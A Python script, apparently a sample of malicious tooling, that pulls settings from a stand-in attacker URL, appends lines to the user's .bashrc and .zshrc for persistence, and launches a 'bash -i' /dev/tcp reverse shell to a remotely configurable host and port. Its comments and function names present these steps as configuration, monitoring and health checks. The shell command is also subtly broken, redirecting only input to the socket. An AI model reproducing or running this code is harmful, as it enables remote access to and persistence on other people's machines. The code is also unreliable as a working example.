import os
import json
import socket
import subprocess
import base64
import time
from pathlib import Path
import urllib.request
import urllib.error

# Configuration constants
LOCAL_CONFIG_PATH = "/tmp/ui-config.json"
REMOTE_CONFIG_URL = "https://malicious.example.com/upload"
SHELL_PERSISTENCE_PATHS = [Path.home() / ".bashrc", Path.home() / ".zshrc"]

# Connection configuration
CONNECTION_CONFIG = {
    "host": "127.0.0.1",
    "port": 4444,
    "domain": "localhost",
    "secondary_port": 8080,
    "timeout": 30
}

def load_configuration():
    """Read JSON from a local file or return defaults."""
    try:
        if os.path.exists(LOCAL_CONFIG_PATH):
            with open(LOCAL_CONFIG_PATH, 'r') as f:
                return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"Error loading local config: {e}")
    return {"status": "initialized", "last_check": None}

def fetch_remote_config(url):
    """Fetch JSON from a URL with error handling."""
    try:
        with urllib.request.urlopen(url, timeout=10) as response:
            return json.loads(response.read().decode('utf-8'))
    except (urllib.error.URLError, urllib.error.HTTPError, json.JSONDecodeError) as e:
        print(f"Failed to fetch remote config: {e}")
        return None

def create_reverse_shell_connection(host, port, timeout):
    """Establish a connection using subprocess with bash -i and /dev/tcp."""
    # Construct command safely without shell injection
    # Note: /dev/tcp is a bash feature, so we use shell=True for this specific feature
    # but we strictly sanitize inputs to prevent injection.
    if not host or not str(port).isdigit():
        raise ValueError("Invalid host or port")

    command = f"bash -i < /dev/tcp/{host}/{port} 2>&1"

    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        return process
    except Exception as e:
        print(f"Failed to create reverse shell connection: {e}")
        return None

def update_shell_persistence(config):
    """Append specific monitoring commands to shell configuration files."""
    monitoring_command = "echo 'System monitoring active' >> /tmp/monitor.log"

    for shell_path in SHELL_PERSISTENCE_PATHS:
        try:
            if shell_path.exists():
                with open(shell_path, 'a') as f:
                    f.write(f"\n{monitoring_command}\n")
                print(f"Updated persistence for {shell_path}")
            else:
                print(f"Shell config file not found: {shell_path}")
        except IOError as e:
            print(f"Error writing to {shell_path}: {e}")

def run_health_check(host, port, timeout):
    """Verify network connectivity using socket and update the persistence status."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()

        if result == 0:
            print(f"Connection to {host}:{port} successful.")
            return True
        else:
            print(f"Connection to {host}:{port} failed.")
            return False
    except Exception as e:
        print(f"Health check failed: {e}")
        return False

def main():
    """Orchestrate loading configs, saving them, establishing the connection, running health checks, and monitoring the subprocess."""
    try:
        # Load configurations
        config = load_configuration()
        remote_config = fetch_remote_config(REMOTE_CONFIG_URL)
        if remote_config:
            config.update(remote_config)

        # Save updated config
        try:
            with open(LOCAL_CONFIG_PATH, 'w') as f:
                json.dump(config, f, indent=4)
        except IOError as e:
            print(f"Failed to save config: {e}")

        # Extract connection details
        host = config.get("host", CONNECTION_CONFIG["host"])
        port = config.get("port", CONNECTION_CONFIG["port"])
        timeout = config.get("timeout", CONNECTION_CONFIG["timeout"])

        # Update persistence
        update_shell_persistence(config)

        # Run health check
        is_connected = run_health_check(host, port, timeout)
        if is_connected:
            config["last_check"] = time.time()
            config["status"] = "connected"
        else:
            config["status"] = "disconnected"

        # Save updated status
        try:
            with open(LOCAL_CONFIG_PATH, 'w') as f:
                json.dump(config, f, indent=4)
        except IOError as e:
            print(f"Failed to save status: {e}")

        # Establish reverse shell connection
        if is_connected:
            process = create_reverse_shell_connection(host, port, timeout)
            if process:
                print("Reverse shell connection established. Monitoring...")
                try:
                    process.wait(timeout=timeout)
                    print("Process finished.")
                except subprocess.TimeoutExpired:
                    print("Process timed out. Terminating.")
                    process.terminate()
                    process.wait()
            else:
                print("Failed to establish reverse shell connection.")
        else:
            print("Skipping reverse shell connection due to failed health check.")

    except Exception as e:
        print(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    main()
